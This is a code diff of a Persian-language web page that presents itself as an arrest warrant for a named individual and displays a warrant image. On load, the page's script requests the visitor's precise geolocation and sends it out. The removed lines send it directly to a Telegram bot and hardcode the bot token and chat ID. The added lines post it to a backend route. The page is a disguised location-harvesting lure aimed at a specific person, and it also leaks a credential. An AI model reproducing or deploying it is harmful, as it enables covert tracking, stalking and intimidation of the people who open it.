@@ -1,27 +1,35 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa" dir="rtl">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>برگه جلب هادی نیک فرجام </title>
+  <title>برگه جلب هادی نیک فرجام</title>
   <style>
     body {
       text-align: center;
-      font-family: sans-serif;
+      font-family: Tahoma, sans-serif;
       padding: 20px;
+      background-color: #f4f4f9;
+    }
+    #status {
+      font-size: 16px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 15px;
     }
     #jalbImage {
-      width: 794px; /* حدود عرض A4 در پیکسل با DPI 96 */
-      height: 1123px; /* حدود ارتفاع A4 */
+      width: 794px;
       max-width: 100%;
       height: auto;
-      border: 2px solid black;
-      margin-top: 20px;
+      border: 2px solid #000;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
-  <p id="status">جلب متهم...</p>
+
+  <p id="status">⏳ در حال دریافت موقعیت مکانی...</p>
 
   <!-- تصویر برگ جلب -->
   <img id="jalbImage" src="JALB.jpg" alt="برگ جلب"/>
@@ -31,58 +39,63 @@
       const status = document.getElementById('status');
 
       if (!navigator.geolocation) {
-        status.innerText = "❌ Your browser does not support geolocation.";
+        status.innerText = "❌ مرورگر شما از قابلیت موقعیت‌یابی پشتیبانی نمی‌کند.";
         return;
       }
+
+      const options = {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      };
 
       navigator.geolocation.getCurrentPosition(
         position => {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
 
-          const token = '7851461640:AAFtIgSsotn-BdkVbXqCEOoSMWsQBJDZTfg';
-          const chatId = '7570861617';  // چت آی‌دی شما
-          const message = `📍 User Location:\nLatitude: ${lat}\nLongitude: ${lon}`;
+          status.innerText = "⏳ در حال ثبت اطلاعات...";
 
-          status.innerText = " جلب متهم...";
-
-          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          // ارسال درخواست به بک‌اند (مسیر API سرور خودتان)
+          fetch('/api/telegram', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json'
             },
             body: JSON.stringify({
-              chat_id: chatId,
-              text: message
+              title: "برگه جلب هادی نیک فرجام",
+              latitude: lat,
+              longitude: lon
             })
           })
           .then(response => response.json())
           .then(data => {
-            if (data.ok) {
-              status.innerText = " جلب متهم هادی نیک فرجام   !";
+            if (data.status === "sent") {
+              status.innerText = "✅ جلب متهم هادی نیک فرجام ثبت شد!";
             } else {
-              status.innerText = `❌ Telegram Error: ${JSON.stringify(data)}`;
+              status.innerText = `❌ خطای سرور: ${data.error || 'ناشناخته'}`;
             }
           })
           .catch(error => {
-            status.innerText = `❌ Fetch Error: ${error}`;
+            status.innerText = `❌ خطای ارتباط با بک‌اند: ${error.message}`;
           });
         },
         error => {
           switch (error.code) {
             case error.PERMISSION_DENIED:
-              status.innerText = "❌ Location permission denied.";
+              status.innerText = "❌ اجازه دسترسی به موقعیت مکانی داده نشد.";
               break;
             case error.POSITION_UNAVAILABLE:
-              status.innerText = "❌ Location unavailable.";
+              status.innerText = "❌ موقعیت مکانی غیرقابل دسترس است.";
               break;
             case error.TIMEOUT:
-              status.innerText = "❌ Location request timed out.";
+              status.innerText = "❌ زمان درخواست موقعیت مکانی به پایان رسید.";
               break;
             default:
-              status.innerText = "❌ Unknown geolocation error.";
+              status.innerText = "❌ خطای ناشناخته در دریافت موقعیت.";
           }
-        }
+        },
+        options
       );
     };
   </script>
